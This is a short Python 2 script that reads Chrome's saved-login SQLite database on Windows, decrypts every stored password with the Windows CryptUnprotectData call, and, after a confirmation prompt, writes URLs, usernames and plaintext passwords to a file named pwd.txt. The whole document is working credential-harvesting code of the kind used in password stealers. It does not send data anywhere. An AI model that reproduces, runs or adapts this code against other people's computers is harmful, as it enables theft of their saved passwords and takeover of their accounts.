import os
import sqlite3
import win32crypt

#path to user's login data
data_path = os.path.expanduser('~')+"\AppData\Local\Google\Chrome\User Data\Default"

login_db = os.path.join(data_path, 'Login Data')

#db connect and query
c = sqlite3.connect(login_db)
cursor = c.cursor()
select_statement = "SELECT origin_url, username_value, password_value FROM logins"
cursor.execute(select_statement)

login_data = cursor.fetchall()

#URL: credentials dictionary
credential = {}

#decrytping the password
for url, user_name, pwd, in login_data:
	pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0) #This returns a tuple description and the password
	credential[url] = (user_name, pwd[1])

#writing to a text file (CAUTION: Don't leave this text file around!)
prompt = raw_input("[.] Are you sure you want to write all this sensitive data to a text file? \n[.] <y> or <n>\n[>] ")
if prompt.lower() == 'y':
	with open('pwd.txt', 'w') as f:
		for url, credentials in credential.iteritems():
			if credentials[1]:
				f.write("\n"+url+"\n"+credentials[0].encode('utf-8')+ " | "+credentials[1]+"\n")
			else:
				f.write("\n"+url+"\n"+"USERNAME NOT FOUND | PASSWORD NOT FOUND \n")
	print "[.] Successfully written to pwd.txt!"
else:
	quit()